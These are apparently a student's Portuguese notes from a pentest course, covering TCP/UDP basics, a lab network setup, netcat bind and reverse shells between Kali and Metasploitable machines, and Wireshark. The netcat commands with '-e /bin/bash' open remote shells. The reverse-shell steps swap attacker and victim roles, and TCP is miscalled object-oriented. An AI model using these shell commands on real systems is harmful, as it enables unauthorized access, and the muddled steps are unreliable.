# Minhas anotações sobre o Curso de Pentest Womcy

## 09/08 - Resumo

### TCP/IP - conceitos básicos
O TCP é um protocolo orientado a objeto - confiável

Funciona enviando 3 pacotes para abrir a comunicação o three way handshake e para finalizar a comunicação envia 4 pacotes
(detalhar cada pacote)

Ele prioriza a não perder pacotes

UDP - considerado como não confiável
Utilizado em situações que a velocidade é importante mas a perca de pacote não
Ex.: Serviços de voz, streaming, video conferência, serviços de resolução de nomes(DNS)

Algumas vezes ambos podem ser combinados exemplo chat e video em uma chamada do Microsoft Teams

Segue um exemplo de portas sobre cada um dos protocolos:https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP

### Conexão via bind shell e reverse shell - NetCat
Pré-requisitos: Comandos básicos do linux

Ajuda do netcat:
```
nc -h
```

Na aula de hoje comentamos o arquivo de interfaces /etc/network/interfaces
Estando da seguinte maneira
```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
auto eth1
iface eth1 inet static
        address 192.168.11.110
#       gateway 192.168.11.1
        netmask 255.255.255.0
```

Assim conseguiremos a comunicação da rede externa em nossa placa NAT (eth0) e na rede interna inet (eth1)

Reiniciando o serviço de rede da máquina ou a própria máquina

Na máquina do metaspolitable executamos(vítima)
nc -nvlp 1000

Para abrir a comunicação e ficar "ouvindo" essa porta

o mesmo realizamos na maquina atacante kali

sudo nc <ipSemSinaisdaMaquina> 1000

Assim temos a comunicação entre máquinas
  
No entanto, temos somente essa conexão e queremos a execução de um programa remoto(bindshell)

Na máquina vítima, executamos então 
nc -nvlp 1000 -e /bin/bash

No atacante(idem anterior):
  sudo nc 192.168.10.130 1000
  
  
Reverse shell - Posso fazer a minha vítima se conectar em mim e termos um acesso 
Na máquina atacante:
  nc <ipvitima> 1000 -e /bin/bash

  Na máquina vítima:
nc -nlp 100 -v
  
Sendo assim bem díficil de ser detectado tal

Mais informações em: https://github.com/dantesilva/curso-tecnicas-pentest/blob/main/Bind-and-reverse-shell.md do mestre @dantesilva
  
Em suma uma ferramenta do tipo canivete suíço, seja após um acesso na vítima realizado com sucesso ou como uma ferramenta no dia a dia, diante uma impossibilidade de acesso

## 11/08 - Resumo

### Wireshark
Se trata de um analisador de protocolos, capturando na rede as informações trafegadas, uma espécie de Sniffer(como um cão farejador), estando entre as 5 melhores juntamente com o TCPDump e outras

Ele pode ser executado tanto via terminal como no servidor gráfico. Um dos seus cores é a libpcap, tendo assim compatibilidades com demais ferramentas
        
